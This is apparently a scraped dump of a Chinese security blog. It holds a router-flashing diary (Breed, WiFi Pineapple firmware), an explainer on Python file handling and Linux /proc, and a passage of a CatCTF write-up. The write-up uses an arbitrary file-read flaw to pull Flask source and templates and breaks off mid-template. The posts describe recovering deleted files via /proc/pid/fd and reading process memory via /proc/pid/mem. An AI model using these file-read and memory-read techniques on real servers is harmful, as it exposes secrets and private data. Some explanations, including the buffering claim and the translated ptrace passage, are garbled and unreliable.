ssh开了，然后emmmmm 我阵列柜被格式化了 肥肠不错，大半夜的给自己找活干了，折腾一圈，扫了又扫，发现我是正版DeskGenius的受害者，盗版的打开来就全好了 ssh有了，然后是刷Breed，用nc和tar把固件啥的全备份一遍就开刷了 Breed刷进去之后就可以无脑玩了，此时路由器已经刷不坏了。直接把Pineapple固件刷进去 刷进去之后用网线链接，自带的DHCP服务会分配一个172的内网，访问http://172.16.42.1:1471/就可以开始玩了","link":"/2022/12/18/%E6%8A%98%E8%85%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E6%97%A5%E8%AE%B0/"},{"title":"浅谈python与proc","text":"0x00 如果python open了一个文件，发生了什么？从进程的I/O来看，这个文件会先被缓存(buffered)，这意味着在写入这个文件之前，它会被保存在一个临时的位置，而你对它的一切更改都是在更改这个缓存文件，python并不会清空这个缓存区除非程序确定你完成了对这个文件的修改，比如你把这个文件close()了 如果你写入了一个文件，但并没有close，数据并不会被修改，比如: 123456with open('file.txt','r') as file: #对文件的任何操作 file.close() #如果没有这个步骤，那么对文件的修改并不会被保存下来 0x01 /proc目录Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。 用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在/proc下还有三个很重要的目录：net，scsi和sys。 Sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。 除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。 目录 作用 /proc/buddyinfo 每个内存区中的每个order有多少块可用，和内存碎片问题有关 /proc/cmdline 启动时传递给kernel的参数信息 /proc/cpuinfo cpu的信息 /proc/crypto 内核使用的所有已安装的加密密码及细节 /proc/devices 已经加载的设备并分类 /proc/dma 已注册使用的ISA DMA频道列表 /proc/execdomains Linux内核当前支持的execution domains /proc/fb 帧缓冲设备列表，包括数量和控制它的驱动 /proc/filesystems 内核当前支持的文件系统类型 /proc/interrupts x86架构中的每个IRQ中断数 /proc/iomem 每个物理设备当前在系统内存中的映射 /proc/ioports 一个设备的输入输出所使用的注册端口范围 /proc/kcore 代表系统的物理内存，存储为核心文件格式，里边显示的是字节数，等于RAM大小加上4kb /proc/kmsg 记录内核生成的信息，可以通过/sbin/klogd或/bin/dmesg来处理 /proc/loadavg 根据过去一段时间内CPU和IO的状态得出的负载状态，与uptime命令有关 /proc/locks 内核锁住的文件列表 /proc/mdstat 多硬盘，RAID配置信息(md=multiple disks) /proc/meminfo RAM使用的相关信息 /proc/misc 其他的主要设备(设备号为10)上注册的驱动 /proc/modules 所有加载到内核的模块列表 /proc/mounts 系统中使用的所有挂载 /proc/mtrr 系统使用的Memory Type Range Registers (MTRRs) /proc/partitions 分区中的块分配信息 /proc/pci 系统中的PCI设备列表 /proc/slabinfo 系统中所有活动的 slab 缓存信息 /proc/stat 所有的CPU活动信息 /proc/sysrq-trigger 使用echo命令来写这个文件的时候，远程root用户可以执行大多数的系统请求关键命令，就好像在本地终端执行一样。要写入这个文件，需要把/proc/sys/kernel/sysrq不能设置为0。这个文件对root也是不可读的 /proc/uptime 系统已经运行了多久 /proc/swaps 交换空间的使用情况 /proc/version Linux内核版本和gcc版本 /proc/bus 系统总线(Bus)信息，例如pci/usb等 /proc/driver 驱动信息 /proc/fs 文件系统信息 /proc/ide ide设备信息 /proc/irq 中断请求设备信息 /proc/net 网卡设备信息 /proc/scsi scsi设备信息 /proc/tty tty设备信息 /proc/net/dev 显示网络适配器及统计信息 /proc/vmstat 虚拟内存统计信息 /proc/vmcore 内核panic时的内存映像 /proc/diskstats 取得磁盘信息 /proc/schedstat kernel调度器的统计信息 /proc/zoneinfo 显示内存空间的统计信息，对分析虚拟内存行为很有用 |以下是/proc目录中进程N的信息 目录 描述 /proc/N pid为N的进程信息 /proc/N/cmdline 进程启动命令 /proc/N/cwd 链接到进程当前工作目录 /proc/N/environ 进程环境变量列表 /proc/N/exe 链接到进程的执行命令文件 /proc/N/fd 包含进程相关的所有的文件描述符 /proc/N/maps 与进程相关的内存映射信息 /proc/N/mem 指代进程持有的内存，不可读 /proc/N/root 链接到进程的根目录 /proc/N/stat 进程的状态 /proc/N/statm 进程使用的内存的状态 /proc/N/status 进程状态信息，比stat/statm更具可读性 /proc/self 链接到当前正在运行的进程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859-r--r--r-- 1 root root 0 Jan 5 14:48 buddyinfodr-xr-xr-x 4 root root 0 Jan 5 10:05 bus-r--r--r-- 1 root root 0 Jan 5 14:48 cgroups-r--r--r-- 1 root root 0 Jan 5 14:48 cmdline-r--r--r-- 1 root root 0 Jan 5 14:48 consoles-r--r--r-- 1 root root 0 Jan 5 14:48 cpuinfo-r--r--r-- 1 root root 0 Jan 5 14:48 crypto-r--r--r-- 1 root root 0 Jan 5 14:48 devices-r--r--r-- 1 root root 0 Jan 5 14:48 diskstats-r--r--r-- 1 root root 0 Jan 5 14:48 dmadr-xr-xr-x 2 root root 0 Jan 5 14:48 driver-r--r--r-- 1 root root 0 Jan 5 14:48 execdomains-r--r--r-- 1 root root 0 Jan 5 14:48 fb-r--r--r-- 1 root root 0 Jan 5 14:47 filesystemsdr-xr-xr-x 6 root root 0 Jan 5 10:05 fs-r--r--r-- 1 root root 0 Jan 5 14:48 interrupts-r--r--r-- 1 root root 0 Jan 5 14:48 iomem-r--r--r-- 1 root root 0 Jan 5 14:48 ioportsdr-xr-xr-x 25 root root 0 Jan 5 10:05 irq-r--r--r-- 1 root root 0 Jan 5 14:48 kallsymscrw-rw-rw- 1 root root 1, 3 Jan 5 10:05 kcore-r--r--r-- 1 root root 0 Jan 5 14:48 key-userscrw-rw-rw- 1 root root 1, 3 Jan 5 10:05 keys-r-------- 1 root root 0 Jan 5 14:48 kmsg-r-------- 1 root root 0 Jan 5 14:48 kpagecgroup-r-------- 1 root root 0 Jan 5 14:48 kpagecount-r-------- 1 root root 0 Jan 5 14:48 kpageflags-r--r--r-- 1 root root 0 Jan 5 14:48 loadavg-r--r--r-- 1 root root 0 Jan 5 14:48 locks-r--r--r-- 1 root root 0 Jan 5 14:48 mdstat-r--r--r-- 1 root root 0 Jan 5 14:48 meminfo-r--r--r-- 1 root root 0 Jan 5 14:48 misc-r--r--r-- 1 root root 0 Jan 5 14:48 moduleslrwxrwxrwx 1 root root 11 Jan 5 14:48 mounts -&gt; self/mounts-rw-r--r-- 1 root root 0 Jan 5 14:48 mtrrlrwxrwxrwx 1 root root 8 Jan 5 14:48 net -&gt; self/net-r-------- 1 root root 0 Jan 5 14:48 pagetypeinfo-r--r--r-- 1 root root 0 Jan 5 14:48 partitionsdr-xr-xr-x 2 root root 0 Jan 5 14:48 pressurecrw-rw-rw- 1 root root 1, 3 Jan 5 10:05 sched_debug-r--r--r-- 1 root root 0 Jan 5 14:48 schedstatdrwxrwxrwt 2 root root 40 Jan 5 10:05 scsilrwxrwxrwx 1 root root 0 Jan 5 10:05 self -&gt; 4932-r-------- 1 root root 0 Jan 5 14:48 slabinfo-r--r--r-- 1 root root 0 Jan 5 14:48 softirqs-r--r--r-- 1 root root 0 Jan 5 14:48 stat-r--r--r-- 1 root root 0 Jan 5 14:48 swapsdr-xr-xr-x 1 root root 0 Jan 5 10:05 sys--w------- 1 root root 0 Jan 5 10:05 sysrq-triggerdr-xr-xr-x 2 root root 0 Jan 5 14:48 sysvipclrwxrwxrwx 1 root root 0 Jan 5 10:05 thread-self -&gt; 4932/task/4932crw-rw-rw- 1 root root 1, 3 Jan 5 10:05 timer_listdr-xr-xr-x 4 root root 0 Jan 5 14:48 tty-r--r--r-- 1 root root 0 Jan 5 14:48 uptime-r--r--r-- 1 root root 0 Jan 5 14:48 version-r--r--r-- 1 root root 0 Jan 5 14:48 version_signature-r-------- 1 root root 0 Jan 5 14:48 vmallocinfo-r--r--r-- 1 root root 0 Jan 5 14:48 vmstat-r--r--r-- 1 root root 0 Jan 5 14:48 zoneinfo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-r--r--r-- 1 root root 0 Jan 5 14:48 arch_statusdr-xr-xr-x 2 root root 0 Jan 5 14:48 attr-rw-r--r-- 1 root root 0 Jan 5 14:48 autogroup-r-------- 1 root root 0 Jan 5 14:48 auxv-r--r--r-- 1 root root 0 Jan 5 14:48 cgroup--w------- 1 root root 0 Jan 5 14:48 clear_refs-r--r--r-- 1 root root 0 Jan 5 14:48 cmdline-rw-r--r-- 1 root root 0 Jan 5 14:48 comm-rw-r--r-- 1 root root 0 Jan 5 14:48 coredump_filter-r--r--r-- 1 root root 0 Jan 5 14:48 cpusetlrwxrwxrwx 1 root root 0 Jan 5 14:48 cwd -&gt; /-r-------- 1 root root 0 Jan 5 14:48 environlrwxrwxrwx 1 root root 0 Jan 5 14:48 exe -&gt; /usr/bin/python3.10dr-x------ 2 root root 0 Jan 5 14:48 fddr-x------ 2 root root 0 Jan 5 14:48 fdinfo-rw-r--r-- 1 root root 0 Jan 5 14:48 gid_map-r-------- 1 root root 0 Jan 5 14:48 io-r--r--r-- 1 root root 0 Jan 5 14:48 limits-rw-r--r-- 1 root root 0 Jan 5 14:48 loginuiddr-x------ 2 root root 0 Jan 5 14:48 map_files-r--r--r-- 1 root root 0 Jan 5 14:48 maps-rw------- 1 root root 0 Jan 5 14:48 mem-r--r--r-- 1 root root 0 Jan 5 14:48 mountinfo-r--r--r-- 1 root root 0 Jan 5 14:48 mounts-r-------- 1 root root 0 Jan 5 14:48 mountstatsdr-xr-xr-x 6 root root 0 Jan 5 14:48 netdr-x--x--x 2 root root 0 Jan 5 14:48 ns-r--r--r-- 1 root root 0 Jan 5 14:48 numa_maps-rw-r--r-- 1 root root 0 Jan 5 14:48 oom_adj-r--r--r-- 1 root root 0 Jan 5 14:48 oom_score-rw-r--r-- 1 root root 0 Jan 5 14:48 oom_score_adj-r-------- 1 root root 0 Jan 5 14:48 pagemap-r-------- 1 root root 0 Jan 5 14:48 patch_state-r-------- 1 root root 0 Jan 5 14:48 personality-rw-r--r-- 1 root root 0 Jan 5 14:48 projid_maplrwxrwxrwx 1 root root 0 Jan 5 14:47 root -&gt; /-rw-r--r-- 1 root root 0 Jan 5 14:48 sched-r--r--r-- 1 root root 0 Jan 5 14:48 schedstat-r--r--r-- 1 root root 0 Jan 5 14:48 sessionid-rw-r--r-- 1 root root 0 Jan 5 14:48 setgroups-r--r--r-- 1 root root 0 Jan 5 14:48 smaps-r--r--r-- 1 root root 0 Jan 5 14:48 smaps_rollup-r-------- 1 root root 0 Jan 5 14:48 stack-r--r--r-- 1 root root 0 Jan 5 14:48 stat-r--r--r-- 1 root root 0 Jan 5 14:48 statm-r--r--r-- 1 root root 0 Jan 5 14:48 status-r-------- 1 root root 0 Jan 5 14:48 syscalldr-xr-xr-x 3 root root 0 Jan 5 14:48 task-r--r--r-- 1 root root 0 Jan 5 14:48 timers-rw-rw-rw- 1 root root 0 Jan 5 14:48 timerslack_ns-rw-r--r-- 1 root root 0 Jan 5 14:48 uid_map-r--r--r-- 1 root root 0 Jan 5 14:48 wchan 0x02 如果python open了一个文件，/proc 发生了什么？运行如下代码: 12345678import osprint(os.getpid())flag = open('./flag','r')os.remove('./flag')b = input() #阻止Python运行结束 来到pid目录下的/fd目录 12345678root@VM-8-17-ubuntu:/proc/59428/fd# ls -latotal 0dr-x------ 2 root root 0 Jan 5 23:04 .dr-xr-xr-x 9 root root 0 Jan 5 23:03 ..lrwx------ 1 root root 64 Jan 5 23:06 0 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 1 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 2 -&gt; /dev/pts/0lr-x------ 1 root root 64 Jan 5 23:06 3 -&gt; /home/ubuntu/python/flag 这个时候，使用rm -rf ./flag命令删除，再回到这个目录 12345678root@VM-8-17-ubuntu:/proc/59428/fd# ls -latotal 0dr-x------ 2 root root 0 Jan 5 23:04 .dr-xr-xr-x 9 root root 0 Jan 5 23:03 ..lrwx------ 1 root root 64 Jan 5 23:06 0 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 1 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 2 -&gt; /dev/pts/0lr-x------ 1 root root 64 Jan 5 23:06 3 -&gt; '/home/ubuntu/python/flag (deleted)' 如果尝试cat /proc/{pid}/fd/3就可以发现，被删除的flag能被cat出来。 123456789101112root@VM-8-17-ubuntu:/proc/59428/fd# ls0 1 2 3root@VM-8-17-ubuntu:/proc/59428/fd# ls -latotal 0dr-x------ 2 root root 0 Jan 5 23:04 .dr-xr-xr-x 9 root root 0 Jan 5 23:03 ..lrwx------ 1 root root 64 Jan 5 23:06 0 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 1 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 2 -&gt; /dev/pts/0lr-x------ 1 root root 64 Jan 5 23:06 3 -&gt; '/home/ubuntu/python/flag (deleted)'root@VM-8-17-ubuntu:/proc/59428/fd# cat 3testtest 0x03 再进一步？首先，看一下/proc/$pid/maps显示$ pid的内存内容以与过程中相同的方式映射，即，伪文件中偏移量x处的字节与过程中地址x处的字节相同。如果在此过程中未映射地址，则从文件中的相应偏移量读取将返回EIO（输入/输出错误）。例如，由于进程中的第一页从未映射过（因此，对NULL指针的引用完全失败，而不是意外访问实际内存），因此读取/proc/$pid/mem的第一个字节总是会产生I / O错误。找出/proc/$pid/maps映射出了过程存储器的哪些部分。该文件每个映射的区域包含一行，如下所示： 1208048000-08054000 r-xp 00000000 08:01 828061 /bin/cat08c9b000-08cbc000 rw-p 00000000 00:00 0 [heap] 前两个数字是区域的边界（第一个字节的地址和最后一个字节的地址，以六进制表示）。下一列包含权限，如果这是文件映射，则包含有关文件的一些信息（偏移量，设备，索引节点和名称）。 /proc/{pid}/mem是一个特殊的文件，可以访问这个进程的内存，不过在一般的情况下，这东西我们是没法直接拖出来的，内存是一片庞大的沙漠，在这里我们需要地址给予方向。 12要从/proc/$pid/mem读取的进程必须使用带有r--------标志的/proc/$pid/mem附加到该进程。这是调试器在开始调试进程时所做的工作。这也是ptrace对进程的系统调用所做的。读取器完成对PTRACE_ATTACH的读取后，应通过使用strace标志调用/proc/$pid/mem来断开连接。观察到的进程一定不能运行。通常，调用ptrace将停止目标进程（它发送PTRACE_DETACH信号），但是存在竞争状态（信号传递是异步的），因此跟踪程序应调用ptrace(PTRACE_ATTACH, …)（如STOP中所述）。以root用户身份运行的进程可以读取任何进程的内存，而无需调用wait，但是必须停止观察到的进程，否则读取仍将返回ptrace(2)。 这一坨鸟语应该都没看懂吧，没错，我也没看懂，所以我拜访了一下chatGPT,不得不说，chatGPT真的比google好用 You can read from and write to this file to access and modify the memory of the process. This can be useful for debugging and troubleshooting purposes. For example, you can use the dd command to read a block of memory from the /proc/pid/mem file, like this: 1dd if=/proc/pid/mem bs=1 count=1024 skip=0x1234000 This will read 1024 bytes of memory from the process starting at the address 0x1234000. Keep in mind that accessing the memory of a process can be dangerous, as it can potentially cause the process to crash or behave unexpectedly. It is generally best to use caution when using the /proc/pid/mem file. 我英语水平不行，我就不翻译了，师傅们应该能看懂 CATCTF CatCatinfo路由任意文件读取，读到python源代码123456789101112131415161718192021222324252627282930313233343536373839import os import uuid from flask import Flask, request, session, render_template, Markup from cat import cat flag = &quot;&quot; app = Flask( __name__, static_url_path='/', static_folder='static' ) app.config['SECRET_KEY'] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot; if os.path.isfile(&quot;/flag&quot;): flag = cat(&quot;/flag&quot;) os.remove(&quot;/flag&quot;) @app.route('/', methods=['GET']) def index(): detailtxt = os.listdir('./details/') cats_list = [] for i in detailtxt: cats_list.append(i[:i.index('.')]) return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat) @app.route('/info', methods=[&quot;GET&quot;, 'POST']) def info(): filename = &quot;./details/&quot; + request.args.get('file', &quot;&quot;) start = request.args.get('start', &quot;0&quot;) end = request.args.get('end', &quot;0&quot;) name = request.args.get('file', &quot;&quot;)[:request.args.get('file', &quot;&quot;).index('.')] return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end)) @app.route('/admin', methods=[&quot;GET&quot;]) def admin_can_list_root(): if session.get('admin') == 1: return flag else: session['admin'] = 0 return &quot;NoNoNo&quot; if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=5637) 尝试proc/self/fd读环境变量不行，看样子也不是SSTI，想了想，应该是session下手了。 问题来了，uuid4()无法破解 峰回路转，看到cat，尝试读取一下cat.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import os, sys, getopt def cat(filename, start=0, end=0)-&gt;bytes: data = b'' try: start = int(start) end = int(end) except: start=0 end=0 if filename != &quot;&quot; and os.access(filename, os.R_OK): f = open(filename, &quot;rb&quot;) if start &gt;= 0: f.seek(start) if end &gt;= start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = (&quot;File `%s` not exist or can not be read&quot; % filename).encode() return data if __name__ == '__main__': opts,args = getopt.getopt(sys.argv[1:],'-h-f:-s:-e:',['help','file=','start=','end=']) fileName = &quot;&quot; start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == '-h' or opt_name == '--help': print(&quot;[*] Help&quot;) print(&quot;-f --file File name&quot;) print(&quot;-s --start Start position&quot;) print(&quot;-e --end End position&quot;) print(&quot;[*] Example of reading /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd&quot;) print(&quot;python3 cat.py --file /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1&quot;) print(&quot;python3 cat.py -f /etc/passwd -e 5&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1 -e 5&quot;) exit() elif opt_name == '-f' or opt_name == '--file': fileName = opt_value elif opt_name == '-s' or opt_name == '--start': start = opt_value elif opt_name == '-e' or opt_name == '--end': end = opt_value if fileName != &quot;&quot;: print(cat(fileName, start, end)) else: print(&quot;No file to read&quot;) 终于露出只因脚了。 把模板拖出来看一看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;!DOCTYPE HTML&gt;&lt;html class=&quot;no-js&quot;&gt;&lt;head&gt;&lt;!-- Basic Page Needs ================================================== --&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;title&gt;Cat cat&lt;/title&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;&lt;!-- Mobile Specific Metas ================================================== --&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0&quot;&gt;&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;images/favicon.ico&quot;&gt;&lt;!-- CSS ================================================== --&gt;&lt;link href=&quot;css/bootstrap.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/bootstrap-theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/magnific/magnific-popup.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.carousel.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!--[if lte IE 9]&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/ie.css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;link href=&quot;css/custom.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- CUSTOM STYLESHEET FOR STYLING --&gt;&lt;!-- Color Style --&gt;&lt;link href=&quot;colors/color1.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- SCRIPTS ================================================== --&gt;&lt;script src=&quot;js/modernizr.js&quot;&gt;&lt;/script&gt;&lt;!-- Modernizr --&gt;&lt;/head&gt;&lt;body class=&quot;home&quot;&gt;&lt;!--[if lt IE 7]&gt; &lt;p class=&quot;chromeframe&quot;&gt;You are using an outdated browser. &lt;a href=&quot;http://browsehappy.com/&quot;&gt;Upgrade your browser today&lt;/a&gt; or &lt;a href=&quot;http://www.google.com/chromeframe/?redirect=true&quot;&gt;install Google Chrome Frame&lt;/a&gt; to better experience this site.&lt;/p&gt;&lt;![endif]--&gt;&lt;div class=&quot;body&quot;&gt; &lt;!-- Start Header --&gt; &lt;div class=&quot;header-wrapper&quot; style=&quot;height: 60px&quot;&gt; &lt;header class=&quot;site-header&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;site-tagline&quot;&gt;Cat &amp;amp; Many kinds of cats&lt;/div&gt; &lt;a href=&quot;#&quot; class=&quot;btn btn-default btn-sm&quot; id=&quot;contact-info&quot;&gt;&lt;i class=&quot;fa fa-bars&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/header&gt; &lt;/div&gt; &lt;!-- End Header --&gt; &lt;div class=&quot;lgray-bg&quot; style=&quot;background-image:url(images/leaves3.png); background-repeat:repeat&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;h4 class=&quot;stacked-title&quot; style=&quot;background-color:black&quot;&gt;&lt;a href=&quot;/&quot;&gt;Cats&lt;/a&gt;&lt;/h4&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-10 col-sm-12&quot;&gt; &lt;div class=&quot;feature-block&quot; style=&quot;float: left&quot;&gt; &lt;img src=&quot;cats/{{catname}}.jpg&quot; alt=&quot;{{catname}}&quot;&gt; &lt;h5&gt;{{catname}}&lt;/h5&gt; &lt;p&gt;{{info}}&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;spacer-50&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Site Footer --&gt; &lt;div class=&quot;site-footer-bottom&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-left&quot;&gt; &lt;p&gt;&amp;copy; 2022 Cat cat by lx56@blog.lxscloud.top. All Rights Reserved&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-right&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;a id=&quot;back-to-top&quot;&gt;&lt;i class=&quot;fa fa-angle-double-up&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;script src=&quot;js/jquery-2.2.3.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Jquery Library Call --&gt;&lt;script src=&quot;vendor/magnific/jquery.magnific-popup.min.js&quot;&gt;&lt;/script&gt; &lt;!-- PrettyPhoto Plugin --&gt;&lt;script src=&quot;js/ui-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- UI Plugins --&gt;&lt;script src=&quot;js/helper-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- Helper Plugins --&gt;&lt;script src=&quot;vendor/owl-carousel/js/owl.carousel.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Owl Carousel --&gt;&lt;script src=&quot;js/bootstrap.js&quot;&gt;&lt;/script&gt; &lt;!-- UI --&gt;&lt;script src=&quot;js/init.js&quot;&gt;&lt;/script&gt; &lt;!-- All Scripts --&gt;&lt;script src=&quot;vendor/flexslider/js/jquery.flexslider.js&quot;&gt;&lt;/script&gt; &lt;!-- FlexSlider --&gt;&lt;/body&gt;&lt;/html&gt; 文件都是bytes类型，SSTI没的打,emmmmm 再看看index.html，emm还是毫无用处emmmmm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;!DOCTYPE HTML&gt;&lt;html class=&quot;no-js&quot;&gt;&lt;head&gt;&lt;!-- Basic Page Needs ================================================== --&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;title&gt;Cat cat&lt;/title&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;&lt;!-- Mobile Specific Metas ================================================== --&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0&quot;&gt;&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;images/favicon.ico&quot;&gt;&lt;!-- CSS ================================================== --&gt;&lt;link href=&quot;css/bootstrap.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/bootstrap-theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/magnific/magnific-popup.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.carousel.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!--[if lte IE 9]&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/ie.css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;link href=&quot;css/custom.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- CUSTOM STYLESHEET FOR STYLING --&gt;&lt;!-- Color Style --&gt;&lt;link href=&quot;colors/color1.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- SCRIPTS ================================================== --&gt;&lt;script src=&quot;js/modernizr.js&quot;&gt;&lt;/script&gt;&lt;!-- Modernizr --&gt;&lt;/head&gt;&lt;body class=&quot;home&quot;&gt;&lt;!--[if lt IE 7]&gt; &lt;p class=&quot;chromeframe&quot;&gt;You are using an outdated browser. &lt;a href=&quot;http://browsehappy.com/&quot;&gt;Upgrade your browser today&lt;/a&gt; or &lt;a href=&quot;http://www.google.com/chromeframe/?redirect=true&quot;&gt;install Google Chrome Frame&lt;/a&gt; to better experience this site.&lt;/p&gt;&lt;![endif]--&gt;&lt;div class=&quot;body&quot;&gt; &lt;!-- Start Header --&gt; &lt;div class=&quot;header-wrapper&quot; style=&quot;height: 60px&quot;&gt; &lt;header class=&quot;site-header&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;site-tagline&quot;&gt;Cat &amp;amp; Many kinds of cats&lt;/div&gt; &lt;a href=&quot;#&quot; class=&quot;btn btn-default btn-sm&quot; id=&quot;contact-info&quot;&gt;&lt;i class=&quot;fa fa-bars&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/header&gt; &lt;/div&gt; &lt;!-- End Header --&gt; &lt;div class=&quot;lgray-bg&quot; style=&quot;background-image:url(images/leaves3.png); background-repeat:repeat&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;h4 class=&quot;stacked-title&quot; style=&quot;background-color:black&quot;&gt;Cats&lt;/h4&gt; &lt;div class=&quot;row&quot;&gt; {% for a_cat in cats_list %} &lt;div class=&quot;col-md-3 col-sm-6&quot;&gt; &lt;div class=&quot;feature-block&quot;&gt; &lt;img src=&quot;cats/{{a_cat}}.jpg&quot; alt=&quot;{{a_cat}}&quot;&gt; &lt;h5&gt;{{a_cat}}&lt;/h5&gt; &lt;p&gt;&lt;a href=&quot;/info?file={{a_cat}}.txt&quot;&gt;{{cat(&quot;./details/&quot;+a_cat+&quot;.txt&quot;, 0, 80).decode()}}...&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; {% endfor %} &lt;/div&gt; &lt;div class=&quot;spacer-50&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Site Footer --&gt; &lt;div class=&quot;site-footer-bottom&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-left&quot;&gt; &lt;p&gt;&amp;copy; 2022 Cat cat by lx56@blog.lxscloud.top. All Rights Reserved&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div 